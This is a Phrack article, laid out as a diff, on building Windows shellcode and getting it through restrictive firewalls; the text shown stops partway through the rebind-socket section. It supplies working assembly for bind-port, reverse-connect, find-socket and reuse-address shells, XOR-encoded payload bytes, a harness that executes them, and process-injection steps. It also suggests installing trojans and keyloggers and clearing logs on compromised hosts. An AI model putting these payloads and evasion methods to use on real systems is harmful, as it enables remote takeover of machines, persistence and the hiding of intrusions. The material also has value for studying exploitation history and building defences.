@@ -1,0 +1,1297 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0xXX, Issue 0x3e, Phile #0x07 of 0x10
+
+
+|=-----------=[ History and Advances in Windows Shellcode ]=-------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ sk <sk at scan-associates d0t net> ]=----------------=|
+|=------------------------=[ June 22nd, 2004 ]=--------------------------=|
+
+--[ Contents
+
+	1. Abstract
+	2. Introduction to shellcode
+		a. Why shellcode?
+		b. Windows shellcode skeleton
+			i. Getting EIP
+			ii. Decoder
+			iii. Getting address of required function
+			iv. Locating Kernel32 base memory
+			v. Getting GetProcAddress()
+			vi. Getting other functions by name
+			vii. Spawning a shell
+		c. Compiling our shellcode
+	3. The connection
+		a. Bind to port shellcode
+			i. Bind to port shellcode implementation
+			ii. Problem with Bind to port shellcode
+		b. Reverse connect
+			i. Reverse connect shellcode implementation
+			ii. Problem with reverse connect shellcode
+	4. One-way shellcode
+		a. Find socket shellcode
+			i. Problem with find socket shellcode
+		b. Reuse address shellcode
+			i. Reuse address shellcode implementation
+			ii. Problem with reuse address shellcode
+		c. Rebind socket
+			i. Rebind socket shellcode implementation
+		d. Other one-way shellcode
+	5. Transferring file using shellcode
+		a. Uploading file with debug.exe
+		b. Uploading file with VBS
+		c. Retrieving file from command line
+	6. Avoiding IDS detection
+	7. Restarting vulnerable service
+	8. End of shellcode?
+	9. Greetz!
+	10. References
+	11. The code
+
+
+--[ 1. Abstract
+
+Firewall is everywhere in the Internet now. Most of the exploits 
+released in the public have little concern over firewall rules 
+because they are just proof of concept. In real world, we would 
+encounter targets with firewall that will make exploitation harder. 
+We need to overcome these obstacles for a successful penetration 
+testing job. The research of this paper started when we need to take 
+over (own) a machine which is heavily protected with rigid firewall 
+rules. Although we can reach the vulnerable service but the strong 
+firewall rules between us and the server hinder all standard exploits 
+useless.
+
+The objective of the research is to find alternative ways which allow 
+penetration tester to take control of a machine after a successful 
+buffer overflow. A successful buffer overflow in a sense that it will 
+eventually leads to arbitrary code execution. These alternative 
+mechanisms should succeed where others fail even in the most rigid 
+firewall rules.
+
+In our research to find a way to by pass these troublesome firewall 
+rules, we looked into various existing techniques used by exploits in 
+the public and why they fail. Then, we found several mechanisms that 
+will work, but dependence to the vulnerable service. Although we can 
+take over the server using these techniques, we take one step further 
+to develop a more generic technique which is not dependence to any 
+service and can be reuse in most other buffer overflows. 
+
+This paper will start with dissection on a standard Win32 shellcode 
+as an introduction. We will then explore the techniques being used by 
+proof of concept codes to allow attacker to control the target and 
+their limitations. Then, we will introduce a few alternatives 
+techniques which we call "One-way shellcode" and how they may by pass 
+firewall rules. Finally, we also discussed on a possible way to 
+transfer file from command line without breaking the firewall rule.
+
+
+--[ 2. Introduction to shellcode 
+
+An exploit usually consists of two major components:
+1.	Exploitation technique
+2.	Payload
+
+The objective of the exploitation part is to divert the execution 
+path of the vulnerable program. We can achieve that via one of these 
+techniques:
+
+*	Stack-based Buffer Overflow
+*	Heap-based Buffer Overflow
+*	Format String
+*	Integer Overflow
+*	Memory corruption, etc
+
+Even though we may use one or more of those exploitation techniques 
+to control the execution path of a program, each vulnerability need 
+to be exploited differently. Every vulnerability has different way to 
+trigger the bug. We may use different buffer size or character set to 
+trigger the overflow. Although we can probably use the same technique 
+for vulnerabilities in the same class, we cannot use the same code.
+
+Once we control of the execution path, we probably want it to execute 
+our code. Thus, we need to include these code or instruction set in 
+our exploit. The part of code which allows us to execute arbitrary 
+code is known as payload. The payload can virtually do everything a 
+computer program can do with the permission of the vulnerable service. 
+
+A payload that spawns you a shell is known as a shellcode. It allows 
+interactive command execution. Unlike Exploitation technique, a well 
+designed shellcode can easily be reused in other exploits. We will 
+try to build shellcode that can be reused. A basic requirement of a 
+shellcode is the shell and a connection that allow use to use it 
+interactively.
+
+
+--[ 2.a Why shellcode?
+
+Why shellcode? Simply because it is the simplest way that allows the 
+attacker to explore the target system interactively. It might give 
+the attacker the ability to discover internal network, to further 
+penetrate into other computers. A simple "net view /domain" command 
+in Windows box would review many other easy targets.
+
+A shell may also allow upload/download file/database, which is 
+usually needed as proof of successful pen-test. You also may easily 
+install trojan horse, key logger, sniffer, Enterprise worm, WinVNC, 
+etc. An Enterprise Worm could be a computer worm which was written 
+specifically to infect other machine in the same domain using the 
+credential of the primary domain controller. 
+
+A shell is also useful to restart the vulnerable services. This will 
+keep the service running and your client happy. But more importantly, 
+restarting the vulnerable service usually allow us to attack the 
+service again. We also may clean up traces like log files and events 
+with a shell. There are just many other possibilities. 
+
+However, spawning a shell is not the only thing you can do in your 
+payload. As demonstrated by LSD in their Win32 ASM component, you can 
+create a payload that loop and wait for command from the attacker. 
+The attacker could issue a command to the payload to create new 
+connection, upload/download file or spawn a shell. There are also a 
+few others payload strategies in which the payload will loop and wait 
+for additional payload from the attacker.
+
+Regardless whether a payload is spawning a shell or loop to wait for 
+instructions, it still needs to communicate with the attacker. 
+Although we are using payload that spawns a shell throughout this 
+article, the mechanisms being use for communication can be use in 
+other payload strategy.
+
+
+--[ 2.b Windows shellcode skeleton
+
+Shellcode usually start by getting to know where you are during the 
+execution by grapping the EIP value. And then, a decoding process 
+will take place. The process will then jump into the decoded memory 
+area where execution can continue. Before we can do anything useful, 
+we need to find addresses of all functions and API that we need to 
+use in the shellcode. With that, we can setup a socket, and finally 
+spawn a shell.
+
+*	Getting EIP
+*	Decoder
+*	Getting addresses of required functions
+*	Setup socket
+*	Spawning shell
+
+Let's look into what these components suppose to do, in greater 
+detail.
+
+
+--[ 2.b.i Getting EIP
+
+We would like to make our shellcode as reusable as possible. For that, 
+we will avoid using any fixed address which could change in different 
+environment. We will use relative addressing as much as we could. To 
+start with, we need to know where we are in the memory. This address 
+will be our base address. Any variable or function in the shellcode 
+will be relative to this address. To get this address, we can use a 
+CALL and a POP instruction. As we already know, whenever we are 
+calling a function, the return value is push into the stack just 
+before the function is called. So, if the first thing we do in the 
+function is a POP command, we will obtain the return value in a 
+register. As shown below, EAX will be 451005.
+
+450000:		
+		label1:	pop eax
+450005: 		... (eax = 451005)
+
+451000: 		call label1		;start here!
+451005:
+
+Most likely you will find something similar to the code below in a 
+shellcode, which does about the same thing.
+
+450000: 			jmp label1
+450002:	
+		label2: 	jmp cont
+450004:	
+		label1: 	call label2  
+450009:	
+		cont: 		pop eax
+				... 	(eax = 450009)
+
+Another interesting mechanism being use to obtain the EIP is to make 
+use of a few special FPU instructions. This was implemented by Aaron 
+Adams in Vuln-Dev mailing list in the discussion to create pure ASCII 
+shellcode. The code uses fnstenv/fstenv instructions to save the 
+state of the FPU environment.
+
+	fldz
+	fnstenv [esp-12]
+	pop ecx
+	add cl, 10
+	nop
+
+ECX will hold the address of the EIP. However, these instructions 
+will generate non-standard ASCII characters.
+
+
+--[ 2.b.ii Decoder
+
+Buffer overflow usually will not allow NULL and a few special 
+characters. We can avoid using these characters by encoding our 
+shellcode. The easiest encoding scheme is the XOR encoding. In this 
+encoding, we will XOR each char in our shellcode with a predefined 
+value. During execution, a decoder will translate the rest of the 
+code back to real instruction by XOR it again with the predefined 
+value. As shown here, we can set the number of byte we want to decode 
+in ecx, and while eax is pointing to the starting point of our 
+encoded shellcode. We xor the destination byte by byte with 0x96 
+until the loop over. There are other more advance encoding schemes, 
+of cause. We can use a DWORD xor value instead of a char to encode 4 
+bytes at a time. We also may break the code apart by encoding them 
+using a different xor key. All with the purpose to get rid of 
+unusable chars in our shellcode.
+
+	xor	ecx, ecx
+	mov 	cl, 0C6h 			;size	
+loop1:	
+	inc	eax
+	xor 	byte ptr [eax], 96h
+	loop 	loop1
+
+The Metasploit project (http://metasploit.com/) contains a few very 
+useful encoders worth checking.
+
+
+--[ 2.b.iii Getting address of required function
+
+After the decoding process, we will jump into the memory area where 
+the decoded shellcode start to continue our execution. Before we can 
+do anything useful, we must locate the address of all APIs that we 
+need to use and store it in a jump table. We are not going to use any 
+fixed address to API because it is different between service packs. 
+To get the address of API we need, we can use an API called 
+GetProcAddress(). By supplying the name of the function we need to 
+this API, it will return the address where we can call to use it. To 
+obtain the address of GetProcAddress() itself, we can search the 
+export table of the Kernel32.dll in the memory. Kernel32.dll image is 
+located predefined in a memory location depending on the OS.
+
+*	NT - 0x77f00000
+*	2kSP2 & SP3 - 0x77e80000
+*	WinXP - 0x77e60000
+
+Since we know the default base memory of kernel32.dll is located at 
+these locations, we can start looping backward from 0x77f00000 to 
+look for "MZ\x90" byte sequences. Kernel32 start with "MZ\x90" mark 
+just like any Windows application. This trick was used by High Speed 
+Junky (HSJ) in his exploit and it works quite nicely for all the 
+above OS and service pack. However Windows 2000 SP4's Kernel32.dll is 
+located at 0x7c570000. In order to scan the memory from 0x77f00000, 
+we need to setup an exception handler that will catch invalid memory 
+access.
+
+
+--[ 2.b.iv Locating Kernel32 base memory
+
+However, there is a better method to get the kernel32 base memory. 
+Using the fs selector, we can get into our PEB. By searching the 
+PEB_LDR_DATA structure, we will find the list of DLL which our 
+vulnerable program initialized when it start. The list of DLL will be 
+loaded in sequence, first, NTDLL, followed by Kernel32. So, by 
+traveling one nod forward in the list, we will get the base memory of 
+the Kernel32.dll. This technique, complete with the code, has been 
+published by researchers in VX-zine, then used by LSD in their 
+Windows Assembly component. 
+
+	mov   eax,fs:[30h]		; PEB  base
+	mov   eax,[eax+0ch]		; goto PEB_LDR_DATA
+	; first entry in InInitializationOrderModuleList
+	mov   esi,[eax+1ch] 
+	lodsd					; forward to next LIST_ENTRY
+	mov   ebx,[eax+08h]		; Kernel32 base memory
+
+
+--[ 2.b.v Getting GetProcAddress()
+
+Once we know the base address of Kernel32.dll, we can locate its 
+Export Table and look for "GetProcAddress" string. We also can get 
+the total of exported functions. Using the number, we loop until we 
+find the string.
+
+	mov	esi,dword ptr [ebx+3Ch]		;to PE Header
+	add	esi,ebx 
+	mov	esi,dword ptr [esi+78h] 	;to export table
+	add	esi,ebx 
+	mov	edi,dword ptr [esi+20h] 	;to export name table
+	add	edi,ebx 
+	mov	ecx,dword ptr [esi+14h] 	;number of exported function
+	push	esi  
+	xor	eax,eax 			;our counter
+
+For each address in the jump table, we will check if the destination 
+name is match with "GetProcAddress". If not, we increase EAX by one 
+and continue searching. Once we found a match, EAX will be holding 
+our counter. Using the following formula, we can obtain the real 
+address of GetProcAddress().
+
+ProcAddr = (((counter * 2) + Ordinal) * 4) + AddrTable + Kernel32Base
+
+We count until we reach "GetProcAddress". Multiply the index by 2, 
+add it to the address of exported ordinals table. It should now point 
+to the ordinal of GetProcAddress(). Take the value, multiply it by 4. 
+Total it up with the address of the addrress of the table and 
+Kernel32 base address, we will get the real address of the 
+GetProcAddress(). We can use the same technique to get the address of 
+any exported function inside Kernel32. 
+
+
+--[ 2.b.vi Getting other functions by name
+
+Once we get the address of GetProcAddress(), we can easily obtain 
+address of any other API. Since there are quite a number of APIs that 
+we need to use, we (actually, most of these codes were dissass from 
+HSJ's exploit) build a function that take a function name and return 
+the address. To use the function, set ESI pointing to the name of the 
+API we want to load. It must be NULL terminated. Set EDI point to the 
+jump table. A jump table is just a location where we store all 
+addresses of API we need to call. Set ECX to number of API we want it 
+to resolve.
+
+In this example, we call to load 3 APIs:
+
+	mov	edi,esi 		;EDI is the output, our jump table
+	xor	ecx,ecx 
+	mov	cl,3 			;Load 3 APIs
+	call	loadaddr
+
+The "loadaddr" function that get the job done:
+
+loadaddr:
+	mov	al,byte ptr [esi] 
+	inc	esi  
+	test	al,al
+	jne	loadaddr	;loop till we found a NULL
+	push	ecx  
+	push	edx  
+	push	esi  
+	push	ebx  
+	call	edx  		;GetProcAddress(DLL, API_Name);
+	pop	edx  
+	pop	ecx  
+	stosd			;write the output to EDI
+	loop	loadaddr	;loop to get other APIs
+	ret
+
+
+--[ 2.b.vii Spawning a shell
+
+Once we have gone thru those troublesome API address loading, we can 
+finally do something useful. To spawn a shell in Windows, we need to 
+call the CreateProcess() API. To use this API, we need to set up the 
+STARTUPINFO in such a way that, the input, output and error handler 
+will be redirected to a socket. We also will set the structure so 
+that the process will have no window. With the structure setup, we 
+just need to call CreateProcess to launch "cmd.exe" to get an 
+interactive command shell in windows.
+
+;ecx is 0
+	mov	byte ptr [ebp],44h 		;STARTUPINFO size
+	mov	dword ptr [ebp+3Ch],ebx 	;output handler
+	mov	dword ptr [ebp+38h],ebx 	;input handler
+	mov	dword ptr [ebp+40h],ebx 	;error handler
+;STARTF_USESTDHANDLES |STARTF_USESHOWWINDOW
+	mov	word ptr [ebp+2Ch],0101h
+	lea	eax,[ebp+44h] 
+	push	eax  
+	push	ebp  
+	push	ecx  
+	push	ecx  
+	push	ecx  
+	inc	ecx  
+	push	ecx  
+	dec	ecx  
+	push	ecx  
+	push	ecx  
+	push	esi  
+	push	ecx  
+	call	dword ptr [edi-28] ;CreateProcess
+
+
+--[ 2.c Compiling our shellcode
+
+The Code section in the end of the paper contains source code 
+bind.asm. bind.asm is a complete shellcode written in Assembly 
+Language which will create a shell in Windows and bind it to a 
+specific port. Compile bind.asm:
+
+# tasm -l bind.asm
+
+It will produce 2 files:
+1.	bind.obj - the object code
+2.	bind.lst - assembly listing
+
+If we open bind.obj with a hex editor, we will see that the object 
+code start with something similar to this:
+
+01)	80 0A 00 08 62 69 6E 64-2E 61 73 6D 62 88 20 00   ....bind.asmb. .
+02)	00 00 1C 54 75 72 62 6F-20 41 73 73 65 6D 62 6C   ...Turbo Assembl
+03)	65 72 20 20 56 65 72 73-69 6F 6E 20 34 2E 31 99   er  Version 4.1.
+04)	88 10 00 40 E9 49 03 81-2F 08 62 69 6E 64 2E 61   ...@.I../.bind.a
+05)	73 6D 2F 88 03 00 40 E9-4C 96 02 00 00 68 88 03   sm/...@.L....h..
+06)	00 40 A1 94 96 0C 00 05-5F 54 45 58 54 04 43 4F   .@......_TEXT.CO
+07)	44 45 96 98 07 00 A9 B3-01 02 03 01 FE 96 0C 00   DE..............
+08)	05 5F 44 41 54 41 04 44-41 54 41 C2 98 07 00 A9   ._DATA.DATA.....
+09)	00 00 04 05 01 AE 96 06-00 04 46 4C 41 54 39 9A   ..........FLAT9.
+10)	02 00 06 5E 96 08 00 06-44 47 52 4F 55 50 8B 9A   ...^....DGROUP..
+11)	04 00 07 FF 02 5A 88 04-00 40 A2 01 91 A0 B7 01   .....Z...@......
+12)	01 00 00 EB 02 EB 05 E8-F9 FF FF FF 58 83 C0 1B   ............X...
+13)	...
+14)	5A 59 AB E2 EE C3 99 8A-07 00 C1 10 01 01 00 00   ZY..............
+15)	9C 6D 8E 06 D2 7C 26 F6-06 05 00 80 74 0E F7 06   .m...|&.....t...
+
+Our shellcode start with hex code of 0xEB, 0x02 as show in line 12 of 
+the partial hex dump above. It will end with 0xC3 as shown in line 14. 
+We need to use a hex editor to remove the first 176 bytes and the 
+last 26 bytes. (You don't need to do this if you are using NASM 
+compiler, but the author has been using TASM since his MS-DOS age).
+
+Now that we have the shellcode in its pure binary form, we just need 
+to build a simple program that read from this file and produce the 
+corresponding hex value in a C string. Refer to the Code section 
+(xor.cpp) for the code that will do that. The output of the program 
+is our shellcode in C string syntax:
+
+# xor bind.obj
+BYTE shellcode[436] = ""
+"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x58\x83\xC0\x1B\x8D\xA0\x01"
+...
+"\xE2\xEE\xC3";
+
+
+--[ 3 The connection
+
+We have seen some of the basic building block of a shellcode. But we 
+have not cover the connection part of the shellcode. As mentioned, a 
+shellcode needs a shell and a connection to allow interactive command. 
+We want to be able to send any command and see the output. Regardless 
+if we are spawning a shell, transferring file or loop to wait for 
+further command, we need to setup a connection. There are three 
+published techniques: Bind to port, Reverse connect and Find socket 
+shellcode. We will look into each one of these, as well as their 
+limitation. Along the way, various exploits that uses these shellcode 
+will be demonstrated to get a better understanding.
+
+
+--[ 3.a Bind to port shellcode
+
+Bind to port shellcode is popular being used in proof of concept 
+exploit. The shellcode setup a socket, bind it to a specific port and 
+listen for connection. Upon accepting a connection, you spawn a shell.
+
+This following APIs are needed for this type of connection: 
+
+*	WSASocket()
+*	bind()
+*	listen()
+*	accept()
+
+It is important to note that we are using WSASocket() and not 
+socket() to create a socket. Using WSASocket will create a socket 
+that will not have an overlapped attribute. Such socket can be use 
+directly as a input/output/error stream in CreateProcess() API. This 
+eliminates the need to use anonymous pipe to get input/output from a 
+process which exist in older shellcode. The size of the shellcode 
+shrinks quite a bit using this technique. It was first introduced by 
+David Litchfield. You can find many of Bind too port shellcode in 
+Packetstorm Security by debugging shellcode of these exploits:
+
+*	slxploit.c
+*	aspcode.c
+*	aspx_brute.c
+
+
+--[ 3.a.1 Bind to port shellcode implementation
+
+	mov	ebx,eax 
+	mov	word ptr [ebp],2
+	mov	word ptr [ebp+2],5000h 		;port
+	mov	dword ptr [ebp+4], 0 		;IP
+	push	10h  
+	push	ebp  
+	push	ebx  
+	call	dword ptr [edi-12] 		;bind
+	inc	eax
+	push	eax		
+	push	ebx
+	call	dword ptr [edi-8] 		;listen (soc, 1)
+	push	eax
+	push	eax
+	push	ebx
+	call	dword ptr [edi-4] 		;accept
+
+
+Compiling bind.asm will create shellcode (435 bytes) that will work 
+with any service pack. We will test the bind to port shellcode using 
+a simple testing program - testskode.cpp. Copy the shellcode (in C 
+string) generated the xor program and parse it into testskode.cpp:
+
+BYTE shellcode[436] = ""
+"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x58\x83\xC0\x1B\x8D\xA0\x01"
+...
+// this is the bind port of the shellcode
+	*(unsigned short *)&shellcode[0x134] = htons(1212) ^ 0x0000;
+
+	void *ma = malloc(10000);
+	memcpy(ma,shellcode,sizeof(shellcode));
+
+	__asm
+    {
+		mov	eax,ma
+		int 3
+        		jmp    eax
+    }
+	free(ma);
+
+Compile and running testskode.cpp will result in a break point just 
+before we jump to the shellcode. If we let the process continue, it 
+will bind to port 1212 and ready to accept connection. Using netcat, 
+we can connect to port 1212 to get a shell.
+
+
+--[ 3.a.2 Problem with bind to port shellcode
+
+Using proof of concept exploit with bind to port shellcode against 
+server in organization with firewall usually will not work. Even 
+though we successfully exploited the vulnerability and our shellcode 
+executed, we will have difficulties connecting to the bind port. 
+Usually, firewall will allow connection to popular services like port 
+25, 53, 80, etc. But usually these ports are already in used by other 
+applications. Sometimes the firewall rules just did not open these 
+ports. We have to assume that the firewall block every port, expect 
+for the port number of the vulnerable service.
+
+
+--[ 3.b Reverse connect shellcode 
+
+To overcome the limitation of bind to port shellcode, many exploits 
+prefer to use reverse connection shellcode. Instead of binding to a 
+port waiting for connection, the shellcode simply connect to a 
+predefined IP and port number to drop it a shell.
+
+We must include our IP and port number which the target must connect 
+to give a shell in the shellcode. We also must run netcat or anything 
+similar in advance, ready to accept connection. Of cause, we must be 
+using IP address which the victim machine is reachable. Thus, usually 
+we use public IP.
+
+The following APIs are needed to setup this type of connection:
+
+*	WSASocket()
+*	connect()
+
+You can find many of these examples in Packetstorm Security by 
+debugging shellcode of these exploits:
+
+*	jill.c
+*	iis5asp_exp.c
+*	sqludp.c
+*	iis5htr_exp.c
+
+
+--[ 3.b.1 Reverse connect shellcode implementation
+
+push	eax  
+push	eax  
+push	eax  
+push	eax  
+inc	eax  
+push	eax  
+inc	eax  
+push	eax  
+call	dword ptr [edi-8] 	;WSASocketA 
+mov	ebx,eax 
+mov	word ptr [ebp],2
+mov	word ptr [ebp+2],5000h	;port in network byte order
+mov	dword ptr [ebp+4], 2901a8c0h ;IP in network byte order
+push	10h  
+push	ebp  
+push	ebx  
+call	dword ptr [edi-4] ;connect
+
+Compiling reverse.asm will create shellcode (384 bytes) that will 
+work with any service pack. We will use this shellcode in our 
+JRun/ColdFusion exploit. However there is still one problem. This 
+exploit will not accept NULL character. We need to encode our 
+shellcode with an XOR shield. We can use the xor.cpp to encode our 
+shellcode using its third parameter.
+
+First, let's compile reverse.asm:
+
+# \tasm\bin\tasm -l reverse.asm
+
+Then, hex-edit reverse.obj to get our shellcode. Refer to bind to 
+port shellcode on how to do it. Now, use xor.cpp to print the 
+shellcode:
+
+# xor reverse.obj
+BYTE shellcode[384] = ""
+"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x58\x83\xC0\x1B\x8D\xA0\x01"
+"\xFC\xFF\xFF\x83\xE4\xFC\x8B\xEC\x33\xC9\x66\xB9\x5B\x01\x80\x30"
+"\x96\x40\xE2\xFA\xE8\x60\x00\x00\x00\x47\x65\x74\x50\x72\x6F\x63"
+...
+
+The first 36 bytes of the shellcode is our decoder. It has been 
+carefully crafted to avoid NULL. We keep this part of the shellcode. 
+Then, we run xor.cpp again with an extra parameter to xor the code 
+with 0x96.
+
+# xor reverse.obj 96
+BYTE shellcode[384] = ""
+"\x7D\x94\x7D\x93\x7E\x6F\x69\x69\x69\xCE\x15\x56\x8D\x1B\x36\x97"
+"\x6A\x69\x69\x15\x72\x6A\x1D\x7A\xA5\x5F\xF0\x2F\xCD\x97\x16\xA6"
+"\x00\xD6\x74\x6C\x7E\xF6\x96\x96\x96\xD1\xF3\xE2\xC6\xE4\xF9\xF5"
+...
+"\x56\xE3\x6F\xC7\xC4\xC0\xC5\x69\x44\xCC\xCF\x3D\x74\x78\x55";
+
+We take bytes sequence from the 37th bytes onwards. Combine the 
+encoder and the xored shellcode, we will get the actual shellcode 
+that we can use in our exploit.
+
+BYTE shellcode[384] = ""
+"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x58\x83\xC0\x1B\x8D\xA0\x01"
+"\xFC\xFF\xFF\x83\xE4\xFC\x8B\xEC\x33\xC9\x66\xB9\x5B\x01\x80\x30"
+"\x96\x40\xE2\xFA"
+"\x7E\xF6\x96\x96\x96\xD1\xF3\xE2\xC6\xE4\xF9\xF5"
+...
+"\x56\xE3\x6F\xC7\xC4\xC0\xC5\x69\x44\xCC\xCF\x3D\x74\x78\x55";
+
+We can use the following statements in our exploit to change the IP 
+and port to our machine which has netcat listening for a shell.
+ 
+*(unsigned int *)&reverse[0x12f] = resolve(argv[1]) ^ 0x96969696;
+*(unsigned short *)&reverse[0x12a] = htons(atoi(argv[2])) ^ 0x9696;
+
+The JRun/ColdFusion exploit is attached in the Code section 
+(weiwei.pl). The exploit uses Reverse connect shellcode.
+
+
+--[ 3.b.2 Problem with reverse connect shellcode
+
+It is not unusual to find server which has been configure to block 
+out going connection. Firewall usually blocks all outgoing connection 
+from DMZ.
+
+
+--[ 4 One-Way shellcode
+
+With the assumption that firewall has been configured with the 
+following rules:
+
+*	Blocks all ports except for listening ports of the services
+*	Blocks all outgoing connections from server
+
+Is there any way to control the server remotely? In some case, it is 
+possible to use existing resources in the vulnerable service to 
+establish the control. For example, it may be possible to hook 
+certain functions in the vulnerable service so that it will take over 
+socket connection or anything similar. The new function may check any 
+network packet for a specific signature. If there is, it may execute 
+command that attached along with the network packet. Otherwise, the 
+packet passes to the original function. We can then connect to the 
+vulnerable service with our signature to trigger a command execution. 
+As early as in 2001, Code Red worm uses some sort of function hooking 
+to deface web site 
+(http://www.eeye.com/html/Research/Advisories/AL20010717.html). 
+
+Another alternative will be to use resources that available from the 
+vulnerable service. It is also possible to patch the vulnerable 
+service to cripple the authentication procedure. This will be useful 
+for services like database, telnet, ftp, SSH and alike. In the case 
+of Web server, it is possible to create PHP/ASP/CGI pages in the web 
+root that will allow remote command execution via web pages. The 
+shellcode in the following link create an ASP page, as implemented by 
+Mikey (Michael Hendrickx):
+
+http://users.pandora.be/0xffffffce/scanit/tools/sc_aspcmd.c
+
+Code Red 2 worm also has a very interesting method to create a 
+backdoor of an IIS server. It creates a virtual path to drive C: and 
+D: of the server to the web root. Using these virtual paths, attacker 
+can execute cmd.exe which will then allow remote command execution:
+
+http://www.eeye.com/html/research/advisories/AL20010804.html
+
+However, these implementations are specific to the service we are 
+exploiting. We hope to find a generic mechanism to bypass the 
+firewall rules so that we can easily reuse our shellcode. With the 
+assumption that the only way to interact with the server is through 
+the port of the vulnerable service, we call these shellcode, One-way 
+shellcode:
+
+*	Find socket
+*	Reuse address socket
+*	Rebind socket
+
+
+--[ 4.a Find socket shellcode
+
+This method was documented in LSD's paper on Unix shellcode 
+(http://lsd-pl.net/unix_assembly.html). Although the code is for Unix, 
+we can use the same technique in the Windows world. The idea is to 
+locate the existing connection that the attacker was using during the 
+attack and use that connection for communication.
+
+Most WinSock API requires only the socket descriptor for its 
+operation. So, we need to find this descriptor. In our implementation, 
+we loop from 0x80 onwards. This number is chosen because socket 
+descriptors below 0x80 are usually not relevant to our network 
+connection. In our experience, using socket descriptor below 0x80 in 
+WinSock API sometimes crash our shellcode due to lack of Stack space.
+
+We will get the destination port of the network connection for each 
+socket descriptor. It is compared with a known value. We hard coded 
+this value in our shellcode. If there is a match, we found our 
+connection. However, socket may not be a non-overlapping socket. 
+Depending on the program that created the socket, there is 
+possibility that the socket we found is an overlapping socket. If 
+this is the case, we cannot use it directly as in/out/err handler in 
+CreateProcess(). To get an interaction communication from this type 
+of socket, we can anonymous pipe. Description on using anonymous pipe 
+in shellcode can be found in article by Dark Spyrit 
+(http://www.phrack.org/show.php?p=55&a=15) and LSD (http://lsd-
+pl.net/windows_components.html).
+
+xor	ebx,ebx
+	mov	bl,80h
+find:
+	inc	ebx
+	mov	dword ptr [ebp],10h
+	lea	eax,[ebp]
+	push	eax
+	lea	eax,[ebp+4]
+	push	eax
+ 	push	ebx	 			;socket
+	call	dword ptr [edi-4]		;getpeername
+	cmp	word ptr [ebp+6],1234h		;myport
+	jne	find
+found:
+	push	ebx				;socket
+
+Find socket shellcode work by comparing the destination port of the 
+socket with a known port number. Thus, attacker must obtain this port 
+number first before sending the shellcode. It can be easily done by 
+calling getsockname() on a connected socket.
+
+It is important to note that this type of shellcode should be use in 
+an environment where the attacker is not in a private IP. If you are 
+in a private IP, your Firewall NATing will create a new connection to 
+the victim machine during your attack. That connection will have a 
+different source port that what you obtain in your machine. Thus, 
+your shellcode will never be able to find the actually connection.
+
+Find socket implementation can be found in findsock.asm in the Code 
+section. There is also a sample usage of find socket shellcode in 
+hellobug.pl, an exploit for MS SQL discovered Dave Aitel.
+
+
+--[ 4.a.1 Problem with Find socket shellcode
+
+Find socket could be perfect, but in some case, socket descriptor of 
+the attacking connection is no longer available. It is possible that 
+the socket might already been closed before it reach the vulnerable 
+code. In some case, the buffer overflow might be in another process 
+altogether.
+
+
+--[ 4.b Reuse address shellcode
+
+Since we fail to find the socket descriptor of our connection in a 
+vulnerability that we are exploiting, we need to find another way. In 
+the worst scenario, the firewall allows incoming connection only to 
+one port; the port which the vulnerable service is using. So, if we 
+can somehow create a bind to port shellcode that actually bind to the 
+port number of the vulnerable service, we can get a shell by 
+connecting to the same port.
+
+Normally, we will not be able to bind to a port which already been 
+used. However, if we set our socket option to SO_REUSEADDR, it is 
+possible bind our shellcode to the same port of the vulnerable 
+service. Moreover, most applications simply bind a port to INADDR_ANY 
+interface, including IIS. If we know the IP address of the server, we 
+can even specify the IP address during bind() so that we can bind our 
+shellcode in front of vulnerable service. Binding it to a specific IP 
+allow us to get the connection first.
+
+Once this is done, we just need to connect to the port number of the 
+vulnerable service to get a shell. It is also interesting to note 
+that Win32 allow any user to connect to port below 1024. Thus, we can 
+use this method even if we get IUSR or IWAM account.
+
+If we don't know the IP address of the server (may be it is using 
+port forwarding to an internal IP), we still can bind the process to 
+INADDR_ANY. However, this means we will have 2 processes excepting 
+connection from the same port on the same interface. In our 
+experience, we may need to connect a few times to get a shell. This 
+is because the other process could occasionally get the connection.
+
+API needed to create a reuse address shellcode:
+
+*	WSASocketA()
+*	setsockopt()
+*	bind()
+*	listen()
+*	accept()
+
+
+--[ 4.b.1 Reuse address shellcode implementation
+
+mov	word ptr [ebp],2
+push	4
+push	ebp
+push	4				;SO_REUSEADDR
+push	0ffffh
+push	ebx
+call	dword ptr [edi-20] 	;setsockopt 
+mov	word ptr [ebp+2],5000h 	;port
+mov	dword ptr [ebp+4], 0h 	;IP, can be 0
+push	10h  
+push	ebp  
+push	ebx  
+call	dword ptr [edi-12] 	;bind
+
+Reuse address shellcode implementation is in reuse.asm (434 bytes) in 
+the Code section. Same usage of this type of shellcode is implemented 
+in reusewb.c exploit. This exploit is using the NTDLL (WebDav) 
+vulnerability on IIS Web server.
+
+
+--[ 4.b.2 Problem with reuse address shellcode
+
+Some applications use SO_EXCLUSIVEADDRUSE, thus reusing the address 
+is not possible. 
+
+
+--[ 4.c Rebind socket shellcode
+
+It is not unusual to find application that actually uses SO_ 
+EXCLUSIVEADDRUSE option to prevent us to reuse its address. So, our 
+research did not stop there. We feel that there is a need to create a 
+better shellcode. Assuming that we have same restriction we have as 
+before. The only way to connect to the vulnerable machine is via the 
+port of the vulnerable service. Instead of sharing the port 
+gracefully as reuse address socket shellcode, we can take over the 
+port number entirely.
+
+If we can terminate the vulnerable service, we can bind our shell 
+into the very same port that was previously used by the vulnerable 
+service. If we can achieve that, the next connection to this port 
+will yield a shell.
+
+However, our shellcode is usually running as part of the vulnerable 
+service. Terminating the vulnerable service will terminate our 
+shellcode.
+
+To get around with this, we need to fork our shellcode into a new 
+process. The new process will bind to a specific port as soon as it 
+is available. The vulnerable service will be forcefully terminated.
+
+Forking is not as simple as in Unix world. Fortunately, LSD has done 
+all the hard work for us (http://lsd-pl.net/windows_components.html). 
+It is done in the following manner as implemented by LSD:
+
+1.	Call CreateProcess() API to create a new process. We must 
+	supply a filename to this API. It doesn't matter which file, as 
+	long as it exist in the system. However, if we choose name like 
+	IExplore, we might be able to bypass even personal firewall. We 
+	also must create the process in Suspend Mode.
+2.	Call GetThreadContext() to retrieve the environment of the 
+	suspended process. This call allows us to retrieve various 
+	information, including CPU registry of the suspended process.
+3.	Use VirtualAllocEx() to create enough buffer for our shellcode 
+	in the suspended process.
